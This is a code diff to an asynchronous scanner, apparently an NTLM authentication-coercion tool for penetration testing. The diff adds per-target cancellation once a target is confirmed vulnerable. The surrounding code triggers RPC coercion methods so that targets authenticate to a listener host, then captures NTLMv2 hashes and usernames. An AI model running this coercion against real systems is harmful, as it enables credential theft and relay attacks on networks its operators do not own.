@@ -183,10 +183,14 @@ class Scanner:
     async def _run_scan(self, methods: list[CoercionMethod]) -> None:
         """Scan mode: try all path styles per method to detect vulnerabilities."""
         allowed = self.config.transport
-        tasks: list[asyncio.Task[None]] = []
         scan_start = time.monotonic()
 
+        # Build a mapping from target to its tasks for cancellation
+        target_tasks: dict[str, list[asyncio.Task[None]]] = {}
+        all_tasks: list[asyncio.Task[None]] = []
+
         for target in self.config.targets:
+            target_tasks[target] = []
             for method in methods:
                 for binding in method.pipe_bindings:
                     for transport_name, path_style in method.path_styles:
@@ -206,9 +210,35 @@ class Scanner:
                                 path_style_override=path_style,
                             )
                         )
-                        tasks.append(task)
+                        target_tasks[target].append(task)
+                        all_tasks.append(task)
 
-        await asyncio.gather(*tasks, return_exceptions=True)
+        # If stop_on_vulnerable is enabled, monitor for vulnerable targets
+        # and cancel remaining tasks for that target
+        if self.config.stop_on_vulnerable:
+
+            async def cancel_target_tasks() -> None:
+                """Monitor vulnerable targets and cancel pending tasks."""
+                while all_tasks:
+                    await asyncio.sleep(0.1)  # Check every 100ms
+                    # Check which targets became vulnerable
+                    for target in list(target_tasks.keys()):
+                        if target in self._vulnerable_targets:
+                            # Cancel all remaining tasks for this target
+                            for task in target_tasks[target]:
+                                if not task.done():
+                                    task.cancel()
+                            del target_tasks[target]
+                    # Exit if all tasks done
+                    if all(task.done() for task in all_tasks):
+                        break
+
+            # Run cancellation monitor alongside tasks
+            monitor_task = asyncio.create_task(cancel_target_tasks())
+            await asyncio.gather(*all_tasks, monitor_task, return_exceptions=True)
+        else:
+            # Normal mode: just wait for all tasks
+            await asyncio.gather(*all_tasks, return_exceptions=True)
 
         # Drain period: keep the listener running while ongoing handshakes
         # complete, then sweep results to upgrade ACCESSIBLE → VULNERABLE
@@ -378,117 +408,129 @@ class Scanner:
         """Single trigger attempt, bounded by semaphore."""
         pool = self._pool
         assert pool is not None
-        async with self._semaphore:
-            # Early exit if target already confirmed vulnerable
-            if self.config.stop_on_vulnerable:
-                async with self._vulnerable_lock:
-                    if target in self._vulnerable_targets:
-                        log.debug(
-                            "Skipping %s (already confirmed vulnerable via --stop-on-vulnerable)",
-                            target,
-                        )
-                        return
 
-            transport = transport_override or Transport.SMB
-            path_style = path_style_override or "share_file"
-
-            use_listener = self.config.has_listener and self._listener is not None
-
-            if not use_listener:
-                # No listener: dummy path, classify errors only
-                path = build_unc_path(
-                    "127.0.0.1", "coercexscan", transport, path_style=path_style
-                )
-                result = await pool.trigger_method(target, method, binding, path)
-            else:
-                # Listener active: real path with correlation token
-                listener = self._listener
-                assert listener is not None
-                token, future = listener.create_token(target_ip=target)
-
-                port = self._unc_port(transport)
-                path = build_unc_path(
-                    self.config.listener_host,
-                    token,
-                    transport,
-                    port=port,
-                    path_style=path_style,
-                )
-
-                # Record wall-clock BEFORE trigger so we can check for
-                # callbacks that arrived during this attempt's window
-                # even if FIFO assigned them to the wrong token.
-                t_before = time.monotonic()
-
-                result = await pool.trigger_method(target, method, binding, path)
-
-                # Wait for callback if trigger indicated vulnerability
-                if result.result in (
-                    TriggerResult.VULNERABLE,
-                    TriggerResult.ACCESSIBLE,
-                ):
-                    try:
-                        callback = await asyncio.wait_for(
-                            future, timeout=self.config.callback_timeout
-                        )
-                        result.callback_received = True
-                        result.source_ip = callback.source_ip
-                        result.result = TriggerResult.VULNERABLE
-                        # Propagate NTLM metadata from SMB2 handshake
-                        if callback.ntlmv2_hash:
-                            result.ntlmv2_hash = callback.ntlmv2_hash
-                        if callback.username:
-                            result.auth_user = (
-                                f"{callback.domain}\\{callback.username}"
-                                if callback.domain
-                                else callback.username
-                            )
-                    except asyncio.TimeoutError:
-                        # Token-based correlation failed (FIFO race).
-                        # Fall back to timestamp check: did ANY callback
-                        # arrive from this target since we fired?
-                        fallback = listener.get_callback_since(target, t_before)
-                        if fallback is not None:
-                            result.callback_received = True
-                            result.result = TriggerResult.VULNERABLE
-                            result.source_ip = fallback.source_ip
-                            if fallback.ntlmv2_hash:
-                                result.ntlmv2_hash = fallback.ntlmv2_hash
-                            if fallback.username:
-                                result.auth_user = (
-                                    f"{fallback.domain}\\{fallback.username}"
-                                    if fallback.domain
-                                    else fallback.username
-                                )
+        try:
+            async with self._semaphore:
+                # Early exit if target already confirmed vulnerable
+                if self.config.stop_on_vulnerable:
+                    async with self._vulnerable_lock:
+                        if target in self._vulnerable_targets:
                             log.debug(
-                                "Timestamp fallback: %s %s::%s upgraded to VULNERABLE",
+                                "Skipping %s (already confirmed vulnerable via --stop-on-vulnerable)",
                                 target,
-                                method.protocol_short,
-                                method.function_name,
                             )
+                            return
+
+                transport = transport_override or Transport.SMB
+                path_style = path_style_override or "share_file"
+
+                use_listener = self.config.has_listener and self._listener is not None
+
+                if not use_listener:
+                    # No listener: dummy path, classify errors only
+                    path = build_unc_path(
+                        "127.0.0.1", "coercexscan", transport, path_style=path_style
+                    )
+                    result = await pool.trigger_method(target, method, binding, path)
                 else:
-                    listener.cancel_token(token)
+                    # Listener active: real path with correlation token
+                    listener = self._listener
+                    assert listener is not None
+                    token, future = listener.create_token(target_ip=target)
 
-            # Populate transport / path_style on every result
-            result.transport = transport.name.lower()
-            result.path_style = path_style
+                    port = self._unc_port(transport)
+                    path = build_unc_path(
+                        self.config.listener_host,
+                        token,
+                        transport,
+                        port=port,
+                        path_style=path_style,
+                    )
 
-            # Mark target as vulnerable if confirmed
-            if (
-                result.result == TriggerResult.VULNERABLE
-                and self.config.stop_on_vulnerable
-            ):
-                async with self._vulnerable_lock:
-                    self._vulnerable_targets.add(target)
-                log.info(
-                    "Target %s confirmed vulnerable (%s::%s) — will skip further methods",
-                    target,
-                    method.protocol_short,
-                    method.function_name,
-                )
+                    # Record wall-clock BEFORE trigger so we can check for
+                    # callbacks that arrived during this attempt's window
+                    # even if FIFO assigned them to the wrong token.
+                    t_before = time.monotonic()
 
-            self.stats.add(result)
-            self._emit(result)
+                    result = await pool.trigger_method(target, method, binding, path)
+
+                    # Wait for callback if trigger indicated vulnerability
+                    if result.result in (
+                        TriggerResult.VULNERABLE,
+                        TriggerResult.ACCESSIBLE,
+                    ):
+                        try:
+                            callback = await asyncio.wait_for(
+                                future, timeout=self.config.callback_timeout
+                            )
+                            result.callback_received = True
+                            result.source_ip = callback.source_ip
+                            result.result = TriggerResult.VULNERABLE
+                            # Propagate NTLM metadata from SMB2 handshake
+                            if callback.ntlmv2_hash:
+                                result.ntlmv2_hash = callback.ntlmv2_hash
+                            if callback.username:
+                                result.auth_user = (
+                                    f"{callback.domain}\\{callback.username}"
+                                    if callback.domain
+                                    else callback.username
+                                )
+                        except asyncio.TimeoutError:
+                            # Token-based correlation failed (FIFO race).
+                            # Fall back to timestamp check: did ANY callback
+                            # arrive from this target since we fired?
+                            fallback = listener.get_callback_since(target, t_before)
+                            if fallback is not None:
+                                result.callback_received = True
+                                result.result = TriggerResult.VULNERABLE
+                                result.source_ip = fallback.source_ip
+                                if fallback.ntlmv2_hash:
+                                    result.ntlmv2_hash = fallback.ntlmv2_hash
+                                if fallback.username:
+                                    result.auth_user = (
+                                        f"{fallback.domain}\\{fallback.username}"
+                                        if fallback.domain
+                                        else fallback.username
+                                    )
+                                log.debug(
+                                    "Timestamp fallback: %s %s::%s upgraded to VULNERABLE",
+                                    target,
+                                    method.protocol_short,
+                                    method.function_name,
+                                )
+                    else:
+                        listener.cancel_token(token)
+
+                # Populate transport / path_style on every result
+                result.transport = transport.name.lower()
+                result.path_style = path_style
+
+                # Mark target as vulnerable if confirmed
+                if (
+                    result.result == TriggerResult.VULNERABLE
+                    and self.config.stop_on_vulnerable
+                ):
+                    async with self._vulnerable_lock:
+                        self._vulnerable_targets.add(target)
+                    log.info(
+                        "Target %s confirmed vulnerable (%s::%s) — will skip further methods",
+                        target,
+                        method.protocol_short,
+                        method.function_name,
+                    )
+
+                self.stats.add(result)
+                self._emit(result)
+        except asyncio.CancelledError:
+            # Task was cancelled due to --stop-on-vulnerable
+            log.debug(
+                "Cancelled: %s %s::%s (target already vulnerable)",
+                target,
+                method.protocol_short,
+                method.function_name,
+            )
+            # Don't record cancelled attempts in stats
+            raise
 
     def _emit(self, result: ScanResult) -> None:
         """Print a result line (only for interesting results unless verbose)."""
